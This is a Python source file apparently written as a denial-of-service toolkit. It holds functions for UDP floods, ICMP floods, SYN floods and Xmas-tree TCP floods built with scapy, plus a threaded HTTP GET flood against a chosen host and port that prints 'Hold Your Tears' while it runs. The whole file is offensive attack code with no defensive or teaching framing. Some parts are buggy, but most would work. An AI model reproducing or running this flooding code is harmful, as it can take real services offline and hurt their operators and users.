from scapy.all import *
from scapy.layers.inet import IP, ICMP, TCP

import random
import socket
import string
import sys
import threading
import time


loops = 10000


def send_packet(amplifier, host, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.connect((str(host), int(port)))
        while True: s.send(b"\x99" * amplifier)
    except: return s.close()


def timer(timeout):
   while True:
       if time.time() > timeout: exit()
       if time.time() < timeout: time.sleep(0.1)


def attack_UDP(method, host, port, duration):
    timeout = time.time() + duration
    timer(timeout)
    if method == "UDP-Flood":
        for sequence in range(loops):
            threading.Thread(target=send_packet(375, host, port), daemon=True).start()
    if method == "UDP-Power":
        for sequence in range(loops):
            threading.Thread(target=send_packet(750, host, port), daemon=True).start()
    if method == "UDP-Mix":
        for sequence in range(loops):
            threading.Thread(target=send_packet(375, host, port), daemon=True).start()
            threading.Thread(target=send_packet(750, host, port), daemon=True).start()


def icmpflood(target,cycle):
    for x in range (0,int(cycle)):
        send(IP(dst=target)/ICMP())


def synflood(target,targetPort,cycle):
    for x in range(0, int(cycle)):
        send(IP(dst=target)/TCP(dport=targetPort,
                                flags="S",
                                seq=RandShort(),
                                ack=RandShort(),
                                sport=RandShort()))

def xmasflood(target,targetPort,cycle):
    for x in range(0, int(cycle)):
        send(IP(dst=target)/TCP(dport=targetPort,
                                flags="FSRPAUEC",
                                seq=RandShort(),
                                ack=RandShort(),
                                sport=RandShort()))




# Parse inputs
host = ""
ip = ""
port = 0
num_requests = 0

# Create a shared variable for thread counts
thread_num = 0
thread_num_mutex = threading.Lock()
def attack_http_flood(target,target_port,num_of_requests):
    host = target
    port = target_port
    num_requests = num_of_requests
    try:
        ip = socket.gethostbyname(host)
    except socket.gaierror:
        print (" ERROR\n Make sure you entered a correct website")
        sys.exit(2)
    print(f"[#] Attack started on {host} ({ip} ) || Port: {str(port)} || # Requests: {str(num_requests)}")

    # Spawn a thread per request
    all_threads = []
    for i in range(num_requests):
        t1 = threading.Thread(target=attack_http_flood_helper)
        t1.start()
        all_threads.append(t1)

        # Adjusting this sleep time will affect requests per second
        time.sleep(0.01)

    for current_thread in all_threads:
        current_thread.join()  # Make the main thread wait for the children threads

# Print thread status
def print_status():
    global thread_num
    thread_num_mutex.acquire(True)

    thread_num += 1
    #print the output on the sameline
    sys.stdout.write(f"\r {time.ctime().split( )[3]} [{str(thread_num)}] #-#-# Hold Your Tears #-#-#")
    sys.stdout.flush()
    thread_num_mutex.release()


# Generate URL Path
def generate_url_path():
    msg = str(string.ascii_letters + string.digits + string.punctuation)
    data = "".join(random.sample(msg, 5))
    return data


# Perform the request
def attack_http_flood_helper():
    print_status()
    url_path = generate_url_path()

    # Create a raw socket
    dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        # Open the connection on that raw socket
        dos.connect((ip, port))

        # Send the request according to HTTP spec
        #old : dos.send("GET /%s HTTP/1.1\nHost: %s\n\n" % (url_path, host))
        byt = (f"GET /{url_path} HTTP/1.1\nHost: {host}\n\n").encode()
        dos.send(byt)
    except socket.error:
        print (f"\n [ No connection, server may be down ]: {str(socket.error)}")
    finally:
        # Close our socket gracefully
        dos.shutdown(socket.SHUT_RDWR)
        dos.close()


